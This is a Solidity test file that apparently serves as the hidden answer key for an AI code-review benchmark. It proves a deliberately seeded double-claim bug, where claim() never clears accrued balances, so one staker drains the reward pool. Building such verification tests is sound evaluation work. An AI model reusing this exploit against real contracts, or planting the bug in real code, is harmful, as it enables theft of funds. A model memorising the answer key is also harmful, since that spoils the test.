// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// GROUND TRUTH — NOT PART OF THE REVIEWED PROJECT.
//
// This file is never copied into the sandbox an agent reviews. It exists to
// prove that the seeded vulnerability in RewardDistributor.claim() is real and
// exploitable, so that "the agent did not find it" is a statement about the
// agent and not about a bug that was never there.
//
// Run it with demo/ground-truth/verify.sh, which copies the project to a temp
// directory outside this repository and drops this test in.

import {IERC20} from "../src/interfaces/IERC20.sol";
import {IRewardDistributor} from "../src/interfaces/IRewardDistributor.sol";
import {StakingVault} from "../src/core/StakingVault.sol";
import {FeeController} from "../src/core/FeeController.sol";
import {RewardDistributor} from "../src/rewards/RewardDistributor.sol";
import {MockERC20} from "../test/mocks/MockERC20.sol";
import {TestBase} from "../test/utils/TestBase.sol";

contract DoubleClaimTest is TestBase {
    MockERC20 internal asset;
    MockERC20 internal reward;
    FeeController internal fees;
    StakingVault internal vault;
    RewardDistributor internal distributor;

    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);

    function setUp() public {
        vm.warp(1_700_000_000);

        asset = new MockERC20("Asset", "AST");
        reward = new MockERC20("Reward", "RWD");
        fees = new FeeController(address(this), address(0xFEE5), 0);
        vault = new StakingVault(IERC20(address(asset)), address(this), address(0), fees, 3 days);
        distributor = new RewardDistributor(IERC20(address(reward)), vault, address(this));
        vault.setRewardDistributor(IRewardDistributor(address(distributor)));

        asset.mint(alice, 1_000 ether);
        asset.mint(bob, 1_000 ether);
        reward.mint(address(this), 1_000 ether);
        reward.approve(address(distributor), type(uint256).max);

        vm.prank(alice);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(bob);
        asset.approve(address(vault), type(uint256).max);
    }

    /// @notice claim() never clears accrued[msg.sender], so a checkpointed
    ///         balance can be withdrawn repeatedly until the pool is empty.
    function test_ClaimCanBeRepeatedToDrainTheRewardPool() public {
        // Two equal stakers. Each is entitled to half of whatever is notified.
        vm.prank(alice);
        vault.deposit(100 ether);
        vm.prank(bob);
        vault.deposit(100 ether);

        distributor.notifyReward(100 ether);

        assertEq(reward.balanceOf(address(distributor)), 100 ether, "pool funded");
        assertEq(distributor.claimable(alice), 50 ether, "alice entitlement");
        assertEq(distributor.claimable(bob), 50 ether, "bob entitlement");

        // Any deposit or withdrawal request checkpoints the account, moving the
        // entitlement out of the index and into accrued[].
        vm.prank(alice);
        vault.deposit(1 ether);
        assertEq(distributor.accrued(alice), 50 ether, "alice checkpointed into accrued");

        // First claim: legitimate.
        vm.prank(alice);
        uint256 first = distributor.claim();
        assertEq(first, 50 ether, "first claim");

        // accrued[alice] was never zeroed, so it is still payable.
        assertEq(distributor.accrued(alice), 50 ether, "accrued survived the claim");

        // Second claim: the same 50 tokens, paid a second time.
        vm.prank(alice);
        uint256 second = distributor.claim();
        assertEq(second, 50 ether, "second claim paid again");

        // Alice was entitled to 50 and extracted 100 — the entire pool.
        assertEq(reward.balanceOf(alice), 100 ether, "alice drained the pool");
        assertEq(reward.balanceOf(address(distributor)), 0, "pool empty");

        // Bob is entitled to 50 and can no longer be paid.
        assertEq(distributor.claimable(bob), 50 ether, "bob still owed");
        vm.prank(bob);
        try distributor.claim() {
            revert("bob was paid from an empty pool");
        } catch {}
    }
}
